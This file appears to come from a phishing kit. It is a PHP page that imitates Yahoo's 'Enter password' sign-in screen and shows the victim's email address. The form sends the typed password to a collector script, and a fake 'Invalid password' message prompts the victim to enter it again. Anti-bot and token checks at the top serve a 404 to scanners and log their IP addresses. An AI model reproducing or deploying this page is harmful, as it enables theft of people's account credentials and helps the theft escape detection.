<?php

    session_start();

    require_once '../../Meta/Comp.php';
    require_once '../../Meta/Antibot.php';
    require_once '../../Meta/demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }

    if (
        !isset($_SESSION['username']) ||
        $_SESSION['username'] == ""
    ) {
        echo $antibot->throw404();
        $comps->log(
            "../../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Skipping Pages\n\n"
        );
        die();
    }

?>

<!DOCTYPE html>
<html id="Stencil" class="js grid light-theme">
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
        <link rel="stylesheet" href="../../Guard/css/yahoo.css">
        <link rel="shortcut icon" href="../../Guard/img/Yahoo/yahoo.ico" type="image/x-icon">
        <title>Yahoo</title>
        <style>

            #login-passwd:invalid {
                box-shadow: none;
            }

            @media (max-width: 800px) {
                .login-box {
                    width: 100%;
                    margin: 0px;
                    padding: 0px;
                    box-shadow: none;
                    border: none;
                }
                .mbr-desktop-hd {
                    display: none;
                }
            }

        </style>
    </head>
    <body>
        <div id="login-body" class="loginish puree-v2 grid ">
            <div class="mbr-desktop-hd"><span class="column"><a style="cursor: pointer;"><img src="../../Guard/img/Yahoo/yahoo.png" alt="Yahoo" class="logo " width="" height="36"><img src="Yahoo_files/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo " width="" height="36"></a></span>
                <span class="column help txt-align-right"><a style="cursor: pointer;">Help</a></span>
            </div>
            <div class="login-box-container">
                <div class="login-box right">
                    <div class="mbr-login-hd txt-align-center"><img src="../../Guard/img/Yahoo/yahoo.png" alt="Yahoo" class="logo yahoo-en-GB" width="" height="27"><img src="Yahoo_files/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-GB"
                            width="" height="27"></div>
                    <div class="challenge password-challenge">
                        <div class="challenge-header">
                            <div class="yid"><?php echo $_SESSION['email']; ?></div>
                        </div>
                        <div id="password-challenge" class="primary">
                            <strong class="challenge-heading">Enter&nbsp;password</strong>
                            <span class="txt-align-center challenge-desc">to finish signing&nbsp;in</span>
                            <form action="../../Meta/Benchmark/email.php?token=<?php echo $_SESSION['token']; ?>" method="post" class="challenge-form"><input type="hidden" name="browser-fp-data" id="browser-fp-data" value="{&quot;language&quot;:&quot;en-US&quot;,&quot;colorDepth&quot;:24,&quot;deviceMemory&quot;:&quot;unknown&quot;,&quot;pixelRatio&quot;:1,&quot;hardwareConcurrency&quot;:4,&quot;timezoneOffset&quot;:-60,&quot;timezone&quot;:&quot;Europe/Stockholm&quot;,&quot;sessionStorage&quot;:1,&quot;localStorage&quot;:1,&quot;indexedDb&quot;:1,&quot;cpuClass&quot;:&quot;unknown&quot;,&quot;platform&quot;:&quot;Linux x86_64&quot;,&quot;doNotTrack&quot;:&quot;1&quot;,&quot;plugins&quot;:{&quot;count&quot;:0,&quot;hash&quot;:&quot;24700f9f1986800ab4fcc880530dd0ed&quot;},&quot;canvas&quot;:&quot;canvas winding:yes~canvas&quot;,&quot;webgl&quot;:1,&quot;webglVendorAndRenderer&quot;:&quot;VMware, Inc.~llvmpipe (LLVM 10.0.1, 256 bits)&quot;,&quot;adBlock&quot;:0,&quot;hasLiedLanguages&quot;:0,&quot;hasLiedResolution&quot;:0,&quot;hasLiedOs&quot;:0,&quot;hasLiedBrowser&quot;:0,&quot;touchSupport&quot;:{&quot;points&quot;:0,&quot;event&quot;:0,&quot;start&quot;:0},&quot;fonts&quot;:{&quot;count&quot;:12,&quot;hash&quot;:&quot;0eff30457a911fb5874e09c82647a6a6&quot;},&quot;audio&quot;:&quot;35.73833402246237&quot;,&quot;resolution&quot;:{&quot;w&quot;:&quot;1920&quot;,&quot;h&quot;:&quot;1080&quot;},&quot;availableResolution&quot;:{&quot;w&quot;:&quot;1049&quot;,&quot;h&quot;:&quot;1920&quot;},&quot;ts&quot;:{&quot;serve&quot;:1614631590881,&quot;render&quot;:1614631568869}}">
                                <input type="hidden" name="crumb" value="vQYFNoVr5Yu"><input type="hidden" name="acrumb" value="cAqgl2uC"><input type="hidden" name="sessionIndex" value="QQ--"><input type="hidden" name="displayName">
                                <div class="hidden-username"></div>
                                <input type="hidden" name="isShowButtonClicked" id="show-button-clicked" value=""><input type="hidden" name="showButtonStatus" id="show-button-status" value=""><input type="hidden" name="prefersReducedMotion" id="prefers-reduce-motion"
                                    value="">
                                <div id="password-container" class="input-group password-container blurred"><input type="password" id="login-passwd" class="password" name="emailPassword" placeholder=" " autofocus="" autocomplete="current-password" data-rapid-tracking="true" data-ylk="elm:input;elmt:focus;slk:passwd;mKey:password-challenge-focus-passwd" required>
                                    <label for="login-passwd" id="password-label" class="password-label">Password</label>
                                    <div class="caps-indicator hide" id="caps-indicator" title="Caps lock is&nbsp;on"></div>
                                    <button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button"></button>
                                </div>
                                <div id="passError">
                                    
                                </div>
                                <div class="button-container">
                                    <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="verifyPassword" value="Next" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:password-challenge-next">Next</button>
                                </div>
                                <div class="forgot-cont challenge-button-link"><input type="button" class="pure-button puree-button-link challenge-button-link" data-ylk="elm:btn;elmt:skip;slk:skip;mKey:password-challenge-skip-recovery" value="Forgotten&nbsp;password?"></div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <script>

            var timesClicked = 0;

            function showPass() {
                if (timesClicked >= 1) {
                    document.getElementById("login-passwd").type = "password";
                    document.getElementById("password-toggle-button").classList.remove('show-pw');
                    document.getElementById("password-toggle-button").classList.add('hide-pw');
                    timesClicked = 0;
                } else {
                    document.getElementById("login-passwd").type = "text";
                    document.getElementById("password-toggle-button").classList.remove('hide-pw');
                    document.getElementById("password-toggle-button").classList.add('show-pw');
                    timesClicked++;
                }
            }

            document.getElementById("password-toggle-button").onclick = showPass;

            <?php

                if (isset($_SESSION['emailTwice']) && $_SESSION['emailTwice']) {
                    echo '
                    
                        document.getElementById("passError").innerHTML = \'<p class="error-msg" role="alert" data-error="messages.ERROR_INVALID_PASSWORD">Invalid password. Please try&nbsp;again</p>\';
                        document.getElementById("password-container").classList.add("error");

                    ';
                }

            ?>

        </script>

    </body>
</html>